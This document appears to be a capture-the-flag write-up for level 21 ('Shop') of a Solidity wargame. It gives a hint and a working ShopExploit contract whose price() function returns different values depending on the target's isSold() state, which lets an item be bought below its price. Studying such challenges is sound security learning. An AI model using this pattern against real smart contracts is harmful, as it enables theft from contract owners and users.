# 21 - Shop

### Hints

<details>

<summary>Hint One</summary>

This level is a lot like “Elevator” but in this case, the same approach of toggling a state variable to determine which value to return won’t work. You will need to return a price > 100 the first time your contract’s `price` function is called, and < 100 the second time. Is it possible to somehow base the return value on the state of the Shop contract itself?

</details>

### Scripted Solution

```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

interface IShop {
    function isSold() external view returns (bool);

    function buy() external;
}

contract ShopExploit {
    IShop private _shopContract;

    /**
     * Constructor sets `Shop` contract and `_price`.
     */
    constructor(address shopContractAddress) {
        _shopContract = IShop(shopContractAddress);
    }

    /**
     * Will be called by `Shop` contract to get item price.
     *
     * Note that this returns a different price depending on whether the `Shop`
     * contract has updated the `isSold` variable when it is called.
     */
    function price() external view returns (uint256) {
        return _shopContract.isSold() ? 0 : 100;
    }

    /**
     * Calls `Shop` contract's `buy`.
     */
    function buy() external {
        _shopContract.buy();
    }
}
```
